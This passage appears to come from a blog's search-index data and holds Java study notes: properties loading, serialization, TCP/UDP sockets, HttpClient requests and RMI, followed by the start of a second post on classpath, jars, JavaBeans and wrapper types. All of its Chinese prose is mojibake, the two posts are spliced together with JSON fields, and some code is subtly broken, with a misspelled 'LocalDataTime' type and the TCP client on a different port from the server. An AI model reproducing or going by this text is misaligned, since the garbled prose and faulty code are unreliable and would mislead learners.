æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ£€æŸ¥è¿”å›çš„InputStreamæ˜¯å¦ä¸ºnullï¼Œå¦‚æœä¸ºnullï¼Œè¡¨ç¤ºèµ„æºæ–‡ä»¶åœ¨classpathä¸­æ²¡æœ‰æ‰¾åˆ°ï¼š\ntry (InputStream input = getClass().getResourceAsStream(\u0026#34;/default.properties\u0026#34;)) { if (input != null) { // TODO: } } å¦‚æœæˆ‘ä»¬æŠŠé»˜è®¤çš„é…ç½®æ”¾åˆ°jaråŒ…ä¸­ï¼Œå†ä»å¤–éƒ¨æ–‡ä»¶ç³»ç»Ÿè¯»å–ä¸€ä¸ªå¯é€‰çš„é…ç½®æ–‡ä»¶ï¼Œå°±å¯ä»¥åšåˆ°æ—¢æœ‰é»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œåˆå¯ä»¥è®©ç”¨æˆ·è‡ªå·±ä¿®æ”¹é…ç½®ï¼š\nProperties props = new Properties(); props.load(inputStreamFromClassPath(\u0026#34;/default.properties\u0026#34;)); props.load(inputStreamFromFile(\u0026#34;./conf.properties\u0026#34;)); è¿™æ ·è¯»å–é…ç½®æ–‡ä»¶ï¼Œåº”ç”¨ç¨‹åºå¯åŠ¨å°±æ›´åŠ çµæ´»\nåºåˆ—åŒ–\u0026amp;ååºåˆ—åŒ– åºåˆ—åŒ–æ˜¯æŒ‡æŠŠä¸€ä¸ªJavaå¯¹è±¡å˜æˆäºŒè¿›åˆ¶å†…å®¹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªbyte[]æ•°ç»„\nä¸€ä¸ªJavaå¯¹è±¡è¦èƒ½åºåˆ—åŒ–ï¼Œå¿…é¡»å®ç°ä¸€ä¸ªç‰¹æ®Šçš„java.io.Serializableæ¥å£(æ ‡è®°æ¥å£Marker Interface)\npublic interface Serializable{ } ååºåˆ—åŒ–æ—¶ï¼Œç”±JVMç›´æ¥æ„é€ å‡ºJavaå¯¹è±¡ï¼Œä¸è°ƒç”¨æ„é€ æ–¹æ³•ï¼Œæ„é€ æ–¹æ³•å†…éƒ¨çš„ä»£ç ï¼Œåœ¨ååºåˆ—åŒ–æ—¶æ ¹æœ¬ä¸å¯èƒ½æ‰§è¡Œï¼ˆåŒPHPï¼‰ï¼Œå¯è®¾ç½®serialVersionUIDä½œä¸ºç‰ˆæœ¬å·\npublic class Person implements Serializable { private static final long serialVersionUID = 2709425275741743919L; } å¯ä»¥é¿å…classå®šä¹‰å˜åŠ¨å¯¼è‡´çš„ä¸å…¼å®¹ï¼Œé€šå¸¸å¯ä»¥ç”±IDEè‡ªåŠ¨ç”Ÿæˆ\nç½‘ç»œç¼–ç¨‹ Socket - TCP ä¸€ä¸ªSocketå°±æ˜¯ç”±ipå’Œportæ„æˆï¼ŒSocketç¼–ç¨‹å°±æ˜¯æŒ‡ä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´çš„ç½‘ç»œé€šä¿¡ï¼ŒServer\u0026amp;Client\n// Server.java import java.io.*; import java.net.ServerSocket; import java.net.Socket; import java.nio.charset.StandardCharsets; public class Server { public static void main(String[] args) throws IOException{ ServerSocket ss = new ServerSocket(6980); System.out.println(\u0026#34;Server is running...\u0026#34;); for(;;){ Socket sock = ss.accept(); System.out.println(\u0026#34;connected from \u0026#34; + sock.getRemoteSocketAddress()); Thread t = new Handler(sock); t.start(); } } } class Handler extends Thread{ Socket sock; public Handler(Socket sock){ this.sock = sock; } @Override public void run(){ try(InputStream input = this.sock.getInputStream()){ try(OutputStream output = this.sock.getOutputStream()){ handle(input, output); } }catch (Exception e){ try { this.sock.close(); }catch (IOException ioe){ } System.out.println(\u0026#34;Client disconnected\u0026#34;); } } private void handle(InputStream input, OutputStream output) throws IOException{ var writer = new BufferedWriter(new OutputStreamWriter(output, StandardCharsets.UTF_8)); var reader = new BufferedReader(new InputStreamReader(input, StandardCharsets.UTF_8)); writer.write(\u0026#34;hello\\n\u0026#34;); writer.flush(); for (;;){ String s = reader.readLine(); if(s.equals(\u0026#34;bye\u0026#34;)){ writer.write(\u0026#34;bye~\\n\u0026#34;); writer.flush(); break; } writer.write(\u0026#34;ok: \u0026#34; + s + \u0026#34;\\n\u0026#34;); writer.flush(); } } } public class Client { public static void main(String[] args) throws IOException { Socket sock = new Socket(\u0026#34;localhost\u0026#34;, 6666); // è¿æ¥æŒ‡å®šæœåŠ¡å™¨å’Œç«¯å£ try (InputStream input = sock.getInputStream()) { try (OutputStream output = sock.getOutputStream()) { handle(input, output); } } sock.close(); System.out.println(\u0026#34;disconnected.\u0026#34;); } private static void handle(InputStream input, OutputStream output) throws IOException { var writer = new BufferedWriter(new OutputStreamWriter(output, StandardCharsets.UTF_8)); var reader = new BufferedReader(new InputStreamReader(input, StandardCharsets.UTF_8)); Scanner scanner = new Scanner(System.in); System.out.println(\u0026#34;[server] \u0026#34; + reader.readLine()); for (;;) { System.out.print(\u0026#34;\u0026gt;\u0026gt;\u0026gt; \u0026#34;); // æ‰“å°æç¤º String s = scanner.nextLine(); // è¯»å–ä¸€è¡Œè¾“å…¥ writer.write(s); writer.newLine(); writer.flush(); String resp = reader.readLine(); System.out.println(\u0026#34;\u0026lt;\u0026lt;\u0026lt; \u0026#34; + resp); if (resp.equals(\u0026#34;bye\u0026#34;)) { break; } } } } æ³¨æ„flush()ï¼Œä¸ç„¶å¯èƒ½éƒ½æ”¶ä¸åˆ°æ¶ˆæ¯\nSocket - UDP Server\nDatagramSocket ds = new DatagramSocket(6666); // ç›‘å¬æŒ‡å®šç«¯å£ for (;;) { // æ— é™å¾ªç¯ // æ•°æ®ç¼“å†²åŒº: byte[] buffer = new byte[1024]; DatagramPacket packet = new DatagramPacket(buffer, buffer.length); ds.receive(packet); // æ”¶å–ä¸€ä¸ªUDPæ•°æ®åŒ… // æ”¶å–åˆ°çš„æ•°æ®å­˜å‚¨åœ¨bufferä¸­ï¼Œç”±packet.getOffset(), packet.getLength()æŒ‡å®šèµ·å§‹ä½ç½®å’Œé•¿åº¦ // å°†å…¶æŒ‰UTF-8ç¼–ç è½¬æ¢ä¸ºString: String s = new String(packet.getData(), packet.getOffset(), packet.getLength(), StandardCharsets.UTF_8); // å‘é€æ•°æ®: byte[] data = \u0026#34;ACK\u0026#34;.getBytes(StandardCharsets.UTF_8); packet.setData(data); ds.send(packet); } æ¥æ”¶UDPæ•°æ®åŒ…ä¹‹å‰å…ˆè¦å‡†å¤‡ç¼“å†²åŒºï¼Œå¹¶é€šè¿‡DatagramPacketå®ç°æ¥æ”¶\nå‡è®¾æˆ‘ä»¬æ”¶å–åˆ°çš„æ˜¯ä¸€ä¸ªStringï¼Œé‚£ä¹ˆï¼Œé€šè¿‡DatagramPacketè¿”å›çš„packet.getOffset()å’Œpacket.getLength()ç¡®å®šæ•°æ®åœ¨ç¼“å†²åŒºçš„èµ·æ­¢ä½ç½®\nå½“æœåŠ¡å™¨æ”¶åˆ°ä¸€ä¸ªDatagramPacketåï¼Œé€šå¸¸å¿…é¡»ç«‹åˆ»å›å¤ä¸€ä¸ªæˆ–å¤šä¸ªUDPåŒ…ï¼Œå› ä¸ºå®¢æˆ·ç«¯åœ°å€åœ¨DatagramPacketä¸­ï¼Œæ¯æ¬¡æ”¶åˆ°çš„DatagramPacketå¯èƒ½æ˜¯ä¸åŒçš„å®¢æˆ·ç«¯ï¼Œå¦‚æœä¸å›å¤ï¼Œå®¢æˆ·ç«¯å°±æ”¶ä¸åˆ°ä»»ä½•UDPåŒ…\nClient\nDatagramSocket ds = new DatagramSocket(); ds.setSoTimeout(1000); ds.connect(InetAddress.getByName(\u0026#34;localhost\u0026#34;), 6666); // è¿æ¥æŒ‡å®šæœåŠ¡å™¨å’Œç«¯å£ // å‘é€: byte[] data = \u0026#34;Hello\u0026#34;.getBytes(); DatagramPacket packet = new DatagramPacket(data, data.length); ds.send(packet); // æ¥æ”¶: byte[] buffer = new byte[1024]; packet = new DatagramPacket(buffer, buffer.length); ds.receive(packet); String resp = new String(packet.getData(), packet.getOffset(), packet.getLength()); ds.disconnect(); è¿™é‡Œçš„connectä¸æ˜¯çœŸè¿æ¥ï¼Œå®ƒæ˜¯ä¸ºäº†åœ¨å®¢æˆ·ç«¯çš„DatagramSocketå®ä¾‹ä¸­ä¿å­˜æœåŠ¡å™¨ç«¯çš„IPå’Œç«¯å£å·ï¼Œç¡®ä¿è¿™ä¸ªDatagramSocketå®ä¾‹åªèƒ½å¾€æŒ‡å®šçš„åœ°å€å’Œç«¯å£å‘é€UDPåŒ…ï¼Œä¸èƒ½å¾€å…¶ä»–åœ°å€å’Œç«¯å£å‘é€ã€‚è¿™ä¹ˆåšä¸æ˜¯UDPçš„é™åˆ¶ï¼Œè€Œæ˜¯Javaå†…ç½®äº†å®‰å…¨æ£€æŸ¥ã€‚\nå¦‚æœå®¢æˆ·ç«¯å¸Œæœ›å‘ä¸¤ä¸ªä¸åŒçš„æœåŠ¡å™¨å‘é€UDPåŒ…ï¼Œé‚£ä¹ˆå®ƒå¿…é¡»åˆ›å»ºä¸¤ä¸ªDatagramSocketå®ä¾‹ã€‚\nåç»­çš„æ”¶å‘æ•°æ®å’ŒæœåŠ¡å™¨ç«¯æ˜¯ä¸€è‡´çš„ã€‚é€šå¸¸æ¥è¯´ï¼Œå®¢æˆ·ç«¯å¿…é¡»å…ˆå‘UDPåŒ…ï¼Œå› ä¸ºå®¢æˆ·ç«¯ä¸å‘UDPåŒ…ï¼ŒæœåŠ¡å™¨ç«¯å°±æ ¹æœ¬ä¸çŸ¥é“å®¢æˆ·ç«¯çš„åœ°å€å’Œç«¯å£å·ã€‚\ndisconnect()ä¹Ÿä¸æ˜¯çœŸæ­£åœ°æ–­å¼€è¿æ¥ï¼Œå®ƒåªæ˜¯æ¸…é™¤äº†å®¢æˆ·ç«¯DatagramSocketå®ä¾‹è®°å½•çš„è¿œç¨‹æœåŠ¡å™¨åœ°å€å’Œç«¯å£å·ï¼Œè¿™æ ·ï¼ŒDatagramSocketå®ä¾‹å°±å¯ä»¥è¿æ¥å¦ä¸€ä¸ªæœåŠ¡å™¨ç«¯ã€‚\nHttpClient URL url = new URL(\u0026#34;http://www.example.com/path/to/target?a=1\u0026amp;b=2\u0026#34;); HttpURLConnection conn = (HttpURLConnection) url.openConnection(); conn.setRequestMethod(\u0026#34;GET\u0026#34;); conn.setUseCaches(false); conn.setConnectTimeout(5000); // è¯·æ±‚è¶…æ—¶5ç§’ // è®¾ç½®HTTPå¤´: conn.setRequestProperty(\u0026#34;Accept\u0026#34;, \u0026#34;*/*\u0026#34;); conn.setRequestProperty(\u0026#34;User-Agent\u0026#34;, \u0026#34;Mozilla/5.0 (compatible; MSIE 11; Windows NT 5.1)\u0026#34;); // è¿æ¥å¹¶å‘é€HTTPè¯·æ±‚: conn.connect(); // åˆ¤æ–­HTTPå“åº”æ˜¯å¦200: if (conn.getResponseCode() != 200) { throw new RuntimeException(\u0026#34;bad response\u0026#34;); } // è·å–æ‰€æœ‰å“åº”Header: Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; map = conn.getHeaderFields(); for (String key : map.keySet()) { System.out.println(key + \u0026#34;: \u0026#34; + map.get(key)); } // è·å–å“åº”å†…å®¹: InputStream input = conn.getInputStream(); ... ä»Java 11å¼€å§‹ï¼Œå¼•å…¥äº†æ–°çš„HttpClient\nimport java.net.URI; import java.net.http.*; import java.net.http.HttpClient.Version; import java.time.Duration; import java.util.*; public class Main { // å…¨å±€HttpClient: static HttpClient httpClient = HttpClient.newBuilder().build(); public static void main(String[] args) throws Exception { String url = \u0026#34;https://www.sina.com.cn/\u0026#34;; HttpRequest request = HttpRequest.newBuilder(new URI(url)) // è®¾ç½®Header: .header(\u0026#34;User-Agent\u0026#34;, \u0026#34;Java HttpClient\u0026#34;).header(\u0026#34;Accept\u0026#34;, \u0026#34;*/*\u0026#34;) // è®¾ç½®è¶…æ—¶: .timeout(Duration.ofSeconds(5)) // è®¾ç½®ç‰ˆæœ¬: .version(Version.HTTP_2).build(); HttpResponse\u0026lt;String\u0026gt; response = httpClient.send(request, HttpResponse.BodyHandlers.ofString()); // HTTPå…è®¸é‡å¤çš„Headerï¼Œå› æ­¤ä¸€ä¸ªHeaderå¯å¯¹åº”å¤šä¸ªValue: Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; headers = response.headers().map(); for (String header : headers.keySet()) { System.out.println(header + \u0026#34;: \u0026#34; + headers.get(header).get(0)); } System.out.println(response.body().substring(0, 1024) + \u0026#34;...\u0026#34;); } } post\nString url = \u0026#34;http://www.example.com/login\u0026#34;; String body = \u0026#34;username=bob\u0026amp;password=123456\u0026#34;; HttpRequest request = HttpRequest.newBuilder(new URI(url)) // è®¾ç½®Header: .header(\u0026#34;Accept\u0026#34;, \u0026#34;*/*\u0026#34;) .header(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;) // è®¾ç½®è¶…æ—¶: .timeout(Duration.ofSeconds(5)) // è®¾ç½®ç‰ˆæœ¬: .version(Version.HTTP_2) // ä½¿ç”¨POSTå¹¶è®¾ç½®Body: .POST(BodyPublishers.ofString(body, StandardCharsets.UTF_8)).build(); HttpResponse\u0026lt;String\u0026gt; response = httpClient.send(request, HttpResponse.BodyHandlers.ofString()); String s = response.body(); RMI ä¸€ä¸ªJVMä¸­çš„ä»£ç å¯ä»¥é€šè¿‡ç½‘ç»œå®ç°è¿œç¨‹è°ƒç”¨å¦ä¸€ä¸ªJVMçš„æŸä¸ªæ–¹æ³•\nè¦å®ç°RMIï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å¿…é¡»å…±äº«åŒä¸€ä¸ªæ¥å£interfaceï¼Œæµ‹è¯•\npublic interface WorldClock extends Remote { LocalDateTime getLocalDateTime(String zoneId) throws RemoteException; } æ­¤æ¥å£å¿…é¡»æ´¾ç”Ÿè‡ªjava.rmi.Remoteï¼Œå¹¶åœ¨æ¯ä¸ªæ–¹æ³•å£°æ˜æŠ›å‡ºRemoteException\nä¸‹ä¸€æ­¥æ˜¯ç¼–å†™æœåŠ¡å™¨çš„å®ç°ç±»ï¼Œå› ä¸ºå®¢æˆ·ç«¯è¯·æ±‚çš„è°ƒç”¨æ–¹æ³•getLocalDateTime()æœ€ç»ˆä¼šé€šè¿‡è¿™ä¸ªå®ç°ç±»è¿”å›ç»“æœ\npublic class WorldClockService implements WorldClock{ @Override public LocalDataTime getLocalDateTime(String zoneId) throws RemoteException{ return LocalDataTime.now(ZoneId.of(zoneId)).withNano(0); } } ç°åœ¨éœ€è¦é€šè¿‡Java RMIæä¾›çš„ä¸€ç³»åˆ—åº•å±‚æ”¯æŒæ¥å£ï¼ŒæŠŠä¸Šé¢ç¼–å†™çš„æœåŠ¡ä»¥RMIçš„å½¢å¼æš´éœ²åœ¨ç½‘ç»œä¸Šï¼Œå®¢æˆ·ç«¯æ‰èƒ½è°ƒç”¨\npublic class Server { public static void main(String[] args) throws RemoteException { System.out.println(\u0026#34;create World clock remote service...\u0026#34;); // å®ä¾‹åŒ–ä¸€ä¸ªWorldClock: WorldClock worldClock = new WorldClockService(); // å°†æ­¤æœåŠ¡è½¬æ¢ä¸ºè¿œç¨‹æœåŠ¡æ¥å£: WorldClock skeleton = (WorldClock) UnicastRemoteObject.exportObject(worldClock, 0); // å°†RMIæœåŠ¡æ³¨å†Œåˆ°1099ç«¯å£: Registry registry = LocateRegistry.createRegistry(1099); // æ³¨å†Œæ­¤æœåŠ¡ï¼ŒæœåŠ¡åä¸º\u0026#34;WorldClock\u0026#34;: registry.rebind(\u0026#34;WorldClock\u0026#34;, skeleton); } } ç”±äºRMIè¦æ±‚æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å…±äº«åŒä¸€ä¸ªæ¥å£ï¼Œå› æ­¤æˆ‘ä»¬è¦æŠŠWorldClock.javaè¿™ä¸ªæ¥å£æ–‡ä»¶å¤åˆ¶åˆ°å®¢æˆ·ç«¯ï¼Œç„¶ååœ¨å®¢æˆ·ç«¯å®ç°RMIè°ƒç”¨\npublic class Client { public static void main(String[] args) throws RemoteException, NotBoundException { // è¿æ¥åˆ°æœåŠ¡å™¨localhostï¼Œç«¯å£1099: Registry registry = LocateRegistry.getRegistry(\u0026#34;localhost\u0026#34;, 1099); // æŸ¥æ‰¾åç§°ä¸º\u0026#34;WorldClock\u0026#34;çš„æœåŠ¡å¹¶å¼ºåˆ¶è½¬å‹ä¸ºWorldClockæ¥å£: WorldClock worldClock = (WorldClock) registry.lookup(\u0026#34;WorldClock\u0026#34;); // æ­£å¸¸è°ƒç”¨æ¥å£æ–¹æ³•: LocalDateTime now = worldClock.getLocalDateTime(\u0026#34;Asia/Shanghai\u0026#34;); // æ‰“å°è°ƒç”¨ç»“æœ: System.out.println(now); } } å¯¹å®¢æˆ·ç«¯æ¥è¯´ï¼Œå®¢æˆ·ç«¯æŒæœ‰çš„WorldClockæ¥å£å®é™…ä¸Šå¯¹åº”äº†ä¸€ä¸ªâ€œå®ç°ç±»â€ï¼Œå®ƒæ˜¯ç”±Registryå†…éƒ¨åŠ¨æ€ç”Ÿæˆçš„ï¼Œå¹¶è´Ÿè´£æŠŠæ–¹æ³•è°ƒç”¨é€šè¿‡ç½‘ç»œä¼ é€’åˆ°æœåŠ¡å™¨ç«¯ã€‚è€ŒæœåŠ¡å™¨ç«¯æ¥æ”¶ç½‘ç»œè°ƒç”¨çš„æœåŠ¡å¹¶ä¸æ˜¯æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„WorldClockServiceï¼Œè€Œæ˜¯Registryè‡ªåŠ¨ç”Ÿæˆçš„ä»£ç ã€‚æˆ‘ä»¬æŠŠå®¢æˆ·ç«¯çš„â€œå®ç°ç±»â€ç§°ä¸ºstubï¼Œè€ŒæœåŠ¡å™¨ç«¯çš„ç½‘ç»œæœåŠ¡ç±»ç§°ä¸ºskeletonï¼Œå®ƒä¼šçœŸæ­£è°ƒç”¨æœåŠ¡å™¨ç«¯çš„WorldClockServiceï¼Œè·å–ç»“æœï¼Œç„¶åæŠŠç»“æœé€šè¿‡ç½‘ç»œä¼ é€’ç»™å®¢æˆ·ç«¯\nRMIé€šè¿‡è‡ªåŠ¨ç”Ÿæˆstubå’Œskeletonå®ç°ç½‘ç»œè°ƒç”¨ï¼Œå®¢æˆ·ç«¯åªéœ€è¦æŸ¥æ‰¾æœåŠ¡å¹¶è·å¾—æ¥å£å®ä¾‹ï¼ŒæœåŠ¡å™¨ç«¯åªéœ€è¦ç¼–å†™å®ç°ç±»å¹¶æ³¨å†Œä¸ºæœåŠ¡\næ•´ä¸ªè¿‡ç¨‹ç”±RMIåº•å±‚è´Ÿè´£å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå¾ˆå®¹æ˜“äº§ç”Ÿå®‰å…¨é—®é¢˜\nå…¶å®ƒçš„è¯­æ³•ç­‰é‡åˆ°äº†å†å­¦ï¼Œä¼°è®¡è¿˜ä¼šæœ‰ä¸ªJavaè¯­æ³•è¡¥å…¨ä¸‹ç¯‡ï¼ˆå¦‚æœæˆ‘ä¸æ‡’çš„è¯\n","date":"2022-02-28T02:40:55+08:00","permalink":"https://amiaaaz.github.io/2022/02/28/java-study-notes-02/","section":"posts","tags":["Java"],"title":"Javaå­¦ä¹ ç¬”è®°â…¡"},{"categories":["NOTES\u0026SUMMARY"],"contents":"ctfé‡Œæœ‰å‡ ç±»é¢˜æˆ‘æ˜¯è§åˆ°ä¹‹åæ‹”è…¿å°±è·‘ï¼Œæ¯”å¦‚javaå’Œxssï¼Œå¯¹äºåè€…ï¼Œæœ€è¿‘æ‚ä¸ƒæ‚å…«çš„å­¦äº†å¾ˆå¤šjså’Œå‰ç«¯çš„çŸ¥è¯† æ²¡é‚£ä¹ˆå‘æ€µäº†ï¼Œè€Œå‰è€…â€¦â€¦ä¸å¤šè¯´äº†ï¼Œå­¦å­¦å­¦ï¼\næœ¬ç¯‡å­¦ä¹ å†…å®¹æ¥è‡ªäºå»–é›ªå³°Javaæ•™ç¨‹ï¼Œä¸ªäººæ„Ÿè§‰æ¯”è¾ƒé€‚åˆå¯¹å…¶å®ƒè¯­è¨€ä¹Ÿæœ‰ä¸€ç‚¹æŒæ¡çš„äºº\næœ¬æœºwin10ï¼Œä¸ºäº†å…¼å®¹ä¸€äº›ç¨‹åºæš‚æ—¶æœ‰java8å’Œ11ä¸¤ä¸ªç‰ˆï¼›ideä½¿ç”¨idea\nJavaåŸºç¡€ javaç¨‹åºç»“æ„ src/xxx.javaï¼Œç±»åä¸ºæ–‡ä»¶åï¼Œmainä¸ºå…¥å£ï¼ˆideaç›´æ¥è¾“mainä¼šè‡ªåŠ¨è¡¥å…¨ï¼‰ï¼Œideaæ ¼å¼åŒ–ä»£ç ctrl+shift+F ç±»classä¹ æƒ¯å¤§å†™å­—æ¯å¼€å¤´ï¼Œæ–¹æ³•methodä¹ æƒ¯å°å†™å­—æ¯å¼€å¤´ï¼Œå¿…é¡»å¸¦åˆ†å·ï¼ˆä¸åŒäºjså¯æœ‰å¯æ— ï¼‰ classpath\u0026amp;jar classpathæ˜¯JVMçš„ç¯å¢ƒå˜é‡ï¼Œæ˜¯ä¸€ç»„ç›®å½•çš„é›†åˆï¼ˆåˆ†éš”ç¬¦ç”±ç³»ç»Ÿå®š æ¨èåœ¨å¯åŠ¨JVMæ—¶è®¾ç½®classpathå˜é‡ï¼Œä¸è¦æ±¡æŸ“ç³»ç»Ÿç¯å¢ƒï¼ˆå¯ä»¥æ”¾å¿ƒçš„äº¤ç»™idea java -classpath .;C:\\work\\project1\\bin;C:\\shared abc.xyz.Hello java -cp .;C:\\work\\project1\\bin;C:\\shared abc.xyz.Hello ä¸è¦æŠŠä»»ä½•Javaæ ¸å¿ƒåº“æ·»åŠ åˆ°classpathä¸­ï¼é»˜è®¤çš„å½“å‰ç›®å½•.å¯¹äºç»å¤§å¤šæ•°æƒ…å†µéƒ½å¤Ÿç”¨\njaråŒ…å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªzipæ ¼å¼çš„å‹ç¼©æ–‡ä»¶ï¼ŒåŒ…å«packageç»„ç»‡çš„ç›®å½•å±‚çº§ï¼Œä»¥åŠå„ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬.classæ–‡ä»¶å’Œå…¶ä»–æ–‡ä»¶ï¼‰ï¼Œæ³¨æ„ä¸å«binç›®å½•ï¼ˆæ³¨æ„å±‚çº§ï¼‰\nå¯ä»¥æŠŠjarç†è§£ä¸ºnå¤šä¸ªclassæ–‡ä»¶çš„å®¹å™¨ï¼ŒJVMè‡ªå¸¦çš„Javaæ ‡å‡†åº“rt.jarä¹Ÿæ˜¯ä»¥jarå½¢å¼è¿›è¡Œå­˜æ”¾\njarä¸å…³å¿ƒclassä¹‹é—´çš„ä¾èµ–ï¼Œå¦‚æœæ¼æ‰çš„è¯åœ¨è¿è¡ŒæœŸææœ‰å¯èƒ½æŠ›å‡ºClassNotFoundException\nå¦‚æœæˆ‘ä»¬è¦æ‰§è¡Œä¸€ä¸ªjaråŒ…çš„classï¼Œå°±å¯ä»¥æŠŠjaråŒ…æ”¾åˆ°classpathä¸­\njava -cp ./hello.jar abc.xyz.Hello MANIFEST.MFæ–‡ä»¶å¯ä»¥æä¾›jaråŒ…çš„ä¿¡æ¯ï¼Œå¦‚Main-Class åˆ†æé¢˜ç›®ä¸­ç»™å‡ºjaråŒ…æ—¶æˆ‘ä¸€èˆ¬ç›´æ¥æ”¹zipè§£å‹ï¼Œç”¨ideaæ‰“å¼€æ•´ä¸ªç›®å½•ä½œä¸ºé¡¹ç›®ï¼ˆidea yyds æ¨¡å— Java9åå¼•å…¥ï¼Œè§£å†³ä¾èµ–é—®é¢˜ï¼Œæ§åˆ¶jarä¹‹é—´çš„ç›¸äº’è°ƒç”¨ æŠŠä¸€å †classå°è£…ä¸ºjarä»…ä»…æ˜¯ä¸€ä¸ªæ‰“åŒ…çš„è¿‡ç¨‹ï¼Œè€ŒæŠŠä¸€å †classå°è£…ä¸ºæ¨¡å—åˆ™ä¸ä½†éœ€è¦æ‰“åŒ…ï¼Œè¿˜éœ€è¦å†™å…¥ä¾èµ–å…³ç³»ï¼Œå¹¶ä¸”è¿˜å¯ä»¥åŒ…å«äºŒè¿›åˆ¶ä»£ç ï¼ˆé€šå¸¸æ˜¯JNIæ‰©å±•ï¼‰ ä»¥javaçš„æ ‡å‡†åº“rt.jarä¸ºä¾‹ï¼Œè¢«æ‹†ä¸º java.base.jmod java.compiler.jmod java.datatransfer.jmod java.desktop.jmod ... ä»¥.jmodä¸ºæ‹“å±•åæ ‡è¯†ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œæ¨¡å—java.baseå¯¹åº”çš„æ–‡ä»¶å°±æ˜¯java.base.jmod\næ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»å·²ç»è¢«å†™å…¥åˆ°æ¨¡å—å†…çš„module-info.classæ–‡ä»¶äº†ã€‚æ‰€æœ‰çš„æ¨¡å—éƒ½ç›´æ¥æˆ–é—´æ¥åœ°ä¾èµ–java.baseæ¨¡å—ï¼Œåªæœ‰java.baseæ¨¡å—ä¸ä¾èµ–ä»»ä½•æ¨¡å—ï¼Œå®ƒå¯ä»¥è¢«çœ‹ä½œæ˜¯æ ¹æ¨¡å—ï¼Œå¥½æ¯”æ‰€æœ‰çš„ç±»éƒ½æ˜¯ä»Objectç›´æ¥æˆ–é—´æ¥ç»§æ‰¿è€Œæ¥ ç¼–å†™æ¨¡å—çš„éƒ¨åˆ†æš‚ç•¥ã€‚\nJavaBean æŒ‡çš„æ˜¯ç¬¦åˆæŸç§è§„èŒƒçš„ä¸€ç§ç¼–ç¨‹æ¨¡å¼æˆ–ç¼–ç¨‹æ€æƒ³ï¼ˆä¸ªäººç†è§£\néƒ¨åˆ†Pythonçˆ±å¥½è€…ä¹Ÿå–œæ¬¢è¿™ä¹ˆå†™ï¼Œå¯æ‹“å±•æ€§å¼ºï¼Œå°±æ˜¯å¾ˆè‡ƒè‚¿\nå†™æ–¹æ³•setterï¼Œè¯»æ–¹æ³•getterï¼Œåªæœ‰å…¶ä¸­ä¸€ç§å±æ€§ä¹‹ä¸€çš„è¢«ç§°ä¸ºåªå†™/è¯»å±æ€§â€”â€”æ»¡è¶³è¿™æ ·è§„èŒƒçš„classè¢«ç§°ä¸ºJavaBean // è¯»æ–¹æ³•: public Type getXyz() // å†™æ–¹æ³•: public void setXyz(Type value) è¦æšä¸¾ä¸€ä¸ªJavaBeançš„æ‰€æœ‰å±æ€§ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨Javaæ ¸å¿ƒåº“æä¾›çš„Introspector import java.beans.*; public class Main { public static void main(String[] args) throws Exception { BeanInfo info = Introspector.getBeanInfo(Person.class);\t// è·å–å±æ€§åˆ—è¡¨ for (PropertyDescriptor pd : info.getPropertyDescriptors()) { System.out.println(pd.getName()); System.out.println(\u0026#34; \u0026#34; + pd.getReadMethod()); System.out.println(\u0026#34; \u0026#34; + pd.getWriteMethod()); } } } class Person { private String name; private int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } è¯­æ³•åŸºç¡€ å˜é‡\u0026amp;æ•°æ®ç±»å‹ ç±»ä¼¼cçš„èµ‹å€¼é£æ ¼ï¼šç±»å‹ å˜é‡å = å˜é‡å€¼ï¼ˆä¸åŒäºgoï¼‰ ç¨‹åºè®¾è®¡çš„ä¸€ä¸ªé‡è¦åŸåˆ™ï¼šæ•°æ®çš„å­˜å‚¨å’Œæ˜¾ç¤ºè¦åˆ†ç¦» æ‰§è¡Œint x = nè¿™æ ·çš„å˜é‡èµ‹å€¼æ—¶ï¼Œç›¸å½“äºä¸¤æ­¥æ“ä½œï¼Œxä¸næ˜¯ä¸åŒçš„å­˜å‚¨å•å…ƒ åŸºæœ¬ç±»å‹æœ‰byte, int, short, long, float, double, boolean, charï¼ˆè¡¨ç¤ºasciiæˆ–ä¸€ä¸ªUnicodeå­—ç¬¦ï¼‰ï¼Œä¸å¯èµ‹å€¼null å¼•ç”¨ç±»å‹ä¸ºæ‰€æœ‰classå’Œinterfaceç±»å‹ï¼Œå¯èµ‹å€¼ä¸ºnullè¡¨ç¤ºç©º ä½¿ç”¨å¯¹åº”çš„Wrapper ClassåŒ…è£…ç±»å¯ä»¥å°†åŸºæœ¬ç±»å‹è§†ä¸ºå¼•ç”¨ç±»å‹(class)ï¼Œå¥½å¤„æ˜¯å¯ä»¥ä½¿ç”¨å¤§é‡çš„å®ç”¨æ–¹æ³• public class Main { public static void main(String[] args) { int i = 100; // é€šè¿‡newæ“ä½œç¬¦åˆ›å»ºIntegerå®ä¾‹(ä¸æ¨èä½¿ç”¨,ä¼šæœ‰ç¼–è¯‘è­¦å‘Š): Integer n1 = new Integer(i); // é€šè¿‡é™æ€æ–¹æ³•valueOf(int)åˆ›å»ºIntegerå®ä¾‹: Integer n2 = Integer.valueOf(i); // é€šè¿‡é™æ€æ–¹æ³•valueOf(String)åˆ›å»ºIntegerå®ä¾‹: Integer n3 = Integer.valueOf(\u0026#34;100\u0026#34;); System.out.println(n3.intValue()); } } æ¯ç§åŸºæœ¬ç±»å‹éƒ½æœ‰å…¶åŒ…è£…ç±»å‹ åŸºæœ¬ç±»å‹ å¯¹åº”çš„å¼•ç”¨ç±»å‹ boolean java.lang.Boolean byte java.lang.Byte short java.lang.Short int java.lang.Integer long java.lang.Long float java.lang.Float double java.lang.Double char java.lang.Character 